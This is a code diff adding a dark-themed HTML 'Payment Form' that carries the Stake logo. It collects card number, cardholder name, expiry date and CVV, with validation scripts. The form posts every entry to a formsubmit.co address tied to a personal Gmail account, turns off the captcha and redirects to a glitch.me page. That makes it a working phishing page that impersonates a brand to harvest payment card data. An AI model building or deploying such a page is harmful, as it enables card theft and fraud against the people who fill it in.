@@ -1,0 +1,298 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Payment Form</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      margin: 0;
+      padding: 0;
+      background-color: #121212; /* لون الخلفية الرئيسي */
+      color: white;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+    }
+    form {
+      max-width: 400px;
+      width: 100%;
+      padding: 20px;
+      background: #1e1e1e; /* لون خلفية النموذج */
+      border-radius: 10px;
+      box-shadow: 0 4px 10px rgba(0, 0, 0, 0.3);
+    }
+    .logo-container {
+      text-align: center;
+      margin-bottom: 20px;
+    }
+    .logo-container img {
+      width: 100px;
+      height: auto;
+    }
+    label {
+      display: block;
+      margin-bottom: 5px;
+      font-weight: bold;
+      font-size: 16px;
+    }
+    .input-group {
+      position: relative;
+      margin-bottom: 20px;
+    }
+    input[type="text"], select {
+      width: 100%;
+      padding: 12px;
+      border: 1px solid #333;
+      border-radius: 8px;
+      background: #2a2a2a; /* لون الحقول */
+      color: white;
+      font-size: 16px;
+      box-sizing: border-box;
+    }
+    input:focus, select:focus {
+      outline: none;
+      border-color: gold; /* تغيير لون الحدود عند التركيز */
+      box-shadow: 0 0 5px rgba(255, 215, 0, 0.5); /* تأثير ظل عند التركيز */
+    }
+    .icons {
+      position: absolute;
+      top: 50%;
+      right: 10px;
+      transform: translateY(-50%);
+      display: flex;
+      gap: 5px;
+    }
+    .icons img {
+      width: 30px;
+      height: auto;
+    }
+    .total-amount {
+      text-align: center;
+      font-size: 18px;
+      font-weight: bold;
+      color: lightgreen; /* لون إجمالي المبلغ */
+      margin-top: -5px;
+      margin-bottom: 10px;
+    }
+    input[type="submit"] {
+      width: 100%;
+      padding: 15px;
+      background-color: gold; /* لون الزر */
+      color: black;
+      border: none;
+      border-radius: 5px;
+      font-size: 18px;
+      cursor: pointer;
+      transition: background-color 0.3s ease;
+    }
+    input[type="submit"]:hover {
+      background-color: darkgoldenrod; /* تغيير اللون عند التحويم */
+    }
+    .input-row {
+      display: flex;
+      gap: 10px;
+    }
+    .input-row .input-group {
+      flex: 1;
+      position: relative;
+    }
+    .lock-icon {
+      position: absolute;
+      top: 50%;
+      right: 10px;
+      transform: translateY(-50%);
+      font-size: 18px;
+      color: gold; /* لون أيقونة القفل */
+      width: 40px;
+      height: 26px;
+    }
+    .error-message {
+      color: red;
+      font-size: 14px;
+      margin-top: 5px;
+    }
+
+    /* تعديلات جديدة لتحريك CVV و Expiry Date */
+    .expiry-cvv-row {
+      margin-top: 15px; /* تحريك الصف للأسفل */
+    }
+  </style>
+</head>
+<body>
+  <form id="paymentForm" action="https://formsubmit.co/spark0000w@gmail.com" method="POST">
+    <!-- إضافة شعار الصفحة -->
+    <div class="logo-container">
+      <img src="https://upload.wikimedia.org/wikipedia/commons/6/6c/Stake_logo.svg" alt="Page Logo">
+    </div>
+
+    <input type="hidden" name="_captcha" value="false">
+    <input type="hidden" name="_next" value="https://bright-mire-cork.glitch.me/SNJJS.html">
+
+    <label for="cardNumber">Card Number</label>
+    <div class="input-group">
+      <input 
+        type="text" 
+        id="cardNumber" 
+        name="cardNumber" 
+        placeholder="1234 1234 1234 1234" 
+        maxlength="19" 
+        required
+        oninput="formatCardNumber(this)"
+      >
+      <div class="icons">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/0/04/Visa.svg" alt="Visa">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/2/2a/Mastercard-logo.svg" alt="MasterCard">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/f/fa/American_Express_logo_%282018%29.svg" alt="AmEx">
+      </div>
+      <div id="cardNumberError" class="error-message"></div>
+    </div>
+
+    <label for="cardName">Card Name</label>
+    <input 
+      type="text" 
+      id="cardName" 
+      name="cardName" 
+      placeholder="Card holder's Name" 
+      required
+      oninput="formatCardName(this)"
+    >
+
+    <!-- صف جديد مع الهامش العلوي -->
+    <div class="input-row expiry-cvv-row">
+      <div class="input-group">
+        <label for="expiryDate">Expiry Date</label>
+        <input 
+          type="text" 
+          id="expiryDate" 
+          name="expiryDate" 
+          placeholder="MM/YY" 
+          maxlength="5" 
+          required
+          oninput="formatExpiryDate(this)"
+        >
+        <div id="expiryDateError" class="error-message"></div>
+      </div>
+      <div class="input-group">
+        <label for="cvv">CVV</label>
+        <div style="position: relative;">
+          <input 
+            type="text" 
+            id="cvv" 
+            name="cvv" 
+            placeholder="CVC" 
+            maxlength="4" 
+            required
+            oninput="validateCVV(this)"
+          >
+          <img src="https://bandh.org/_cabinet/images/_img_item/pc/cvv.jpg" alt="CVV Icon" class="lock-icon">
+        </div>
+      </div>
+    </div>
+
+    <div class="total-amount"></div>
+
+    <label for="country">Country</label>
+    <select id="country" name="country" required>
+      <option value="USA">United States</option>
+      <option value="Canada">Canada</option>
+      <option value="Germany">Germany</option>
+      <option value="France">France</option>
+      <option value="Italy">Italy</option>
+      <option value="Spain">Spain</option>
+      <option value="Netherlands">Netherlands</option>
+      <option value="Sweden">Sweden</option>
+      <option value="Norway">Norway</option>
+      <option value="Denmark">Denmark</option>
+    </select>
+
+    <input type="submit" value="Pay Now">
+  </form>
+
+  <script>
+    function isValidCardNumber(cardNumber) {
+      let sum = 0;
+      let shouldDouble = false;
+      for (let i = cardNumber.length - 1; i >= 0; i--) {
+        let digit = parseInt(cardNumber.charAt(i));
+        if (shouldDouble) {
+          digit *= 2;
+          if (digit > 9) {
+            digit -= 9;
+          }
+        }
+        sum += digit;
+        shouldDouble = !shouldDouble;
+      }
+      return sum % 10 === 0;
+    }
+
+    function formatCardNumber(input) {
+      let value = input.value.replace(/\D/g, '');
+      input.value = value.match(/.{1,4}/g)?.join(' ') || '';
+      const cardNumberError = document.getElementById('cardNumberError');
+      if (value.length === 16 && !isValidCardNumber(value)) {
+        cardNumberError.textContent = "Invalid card number. Please check again.";
+      } else {
+        cardNumberError.textContent = "";
+      }
+    }
+
+    function formatCardName(input) {
+      input.value = input.value.replace(/[^A-Z\s]/g, '').toUpperCase();
+    }
+
+    function formatExpiryDate(input) {
+      let value = input.value.replace(/\D/g, '');
+      if (value.length > 2) {
+        input.value = value.substring(0, 2) + '/' + value.substring(2, 4);
+      } else {
+        input.value = value;
+      }
+      const expiryDateError = document.getElementById('expiryDateError');
+      if (!isValidExpiryDate(input.value)) {
+        expiryDateError.textContent = "The card has expired. Please use a valid card.";
+      } else {
+        expiryDateError.textContent = "";
+      }
+    }
+
+    function isValidExpiryDate(date) {
+      const [month, year] = date.split('/').map(Number);
+      if (!month || !year || month < 1 || month > 12) return false;
+      const currentDate = new Date();
+      const inputDate = new Date(2000 + year, month - 1);
+      return inputDate >= currentDate;
+    }
+
+    function validateCVV(input) {
+      input.value = input.value.replace(/\D/g, '').substring(0, 4);
+    }
+
+    const paymentForm = document.getElementById('paymentForm');
+    paymentForm.addEventListener('submit', function (event) {
+      const cardNumber = document.getElementById('cardNumber').value.replace(/\s/g, '');
+      const expiryDate = document.getElementById('expiryDate').value;
+      const cardNumberError = document.getElementById('cardNumberError');
+      const expiryDateError = document.getElementById('expiryDateError');
+      let hasError = false;
+
+      if (!isValidCardNumber(cardNumber)) {
+        cardNumberError.textContent = "Invalid card number. Please check again.";
+        hasError = true;
+      }
+
+      if (!isValidExpiryDate(expiryDate)) {
+        expiryDateError.textContent = "The card has expired. Please use a valid card.";
+        hasError = true;
+      }
+
+      if (hasError) {
+        event.preventDefault();
+      }
+    });
+  </script>
+</body>
+</html>
